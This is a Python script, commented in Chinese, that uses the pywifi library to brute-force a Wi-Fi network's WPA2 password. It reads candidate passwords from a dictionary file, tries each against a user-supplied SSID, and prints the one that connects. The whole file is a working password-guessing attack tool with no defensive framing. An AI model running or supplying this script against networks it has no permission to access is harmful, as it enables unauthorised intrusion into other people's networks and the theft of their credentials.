import pywifi
from pywifi import const  #引用一些定义
import time
def connect_wifi(name,password):

    wifi = pywifi.PyWiFi()   #抓取WiFi接口
    ifaces = wifi.interfaces()[0]  #一般来说，平台上只有一个Wi-Fi接口。因此，使用索引0来获得Wi-Fi接口
    #print(ifaces.name())  #我们可以试试输出网卡名称
    ifaces.disconnect()  #断开网卡连接

    profile = pywifi.Profile()   #定义配置文件对象
    profile.ssid = name   #wifi名称，貌似不能用中文？
    profile.auth = const.AUTH_ALG_OPEN   #auth - AP的认证算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #选择wifi加密方式  akm - AP的密钥管理类型
    profile.cipher = const.CIPHER_TYPE_CCMP  #cipher - AP的密码类型
    profile.key = password   #wifi密钥 如果无密码，则应该设置此项CIPHER_TYPE_NONE

    ifaces.remove_all_network_profiles()  #删除其他配置文件
    tmp_profile = ifaces.add_network_profile(profile)   #加载配置文件

    ifaces.connect(tmp_profile)   #按配置文件进行连接
    time.sleep(1)  #尝试几秒能否成功连接

    if ifaces.status() == const.IFACE_CONNECTED:   #判断连接状态
        return True
    else:
        return False

def main():
    print("start connect WIFI ...")
    name = input("Enter WIFI ssid：")
    path = r"password.txt"  #密码字典路径
    pwds = open(path,'r')  #读取字典
    while True:
        pwd = pwds.readline()
        pwd = pwd[:-1]   #去除了这行文本的最后一个字符（换行符）后剩下的部分
        print('[*]Trying password：', pwd)
        bool = connect_wifi(name,pwd)
        if bool:
            print('[+]WIFI connection successful!')
            print("密码为：",pwd)
            break
        else:
            print("[-]WIFI connection fails！")
        if not pwd:   #如果文件逐行读取完，则退出
            break
    pwds.close()

if __name__=="__main__":
    main()
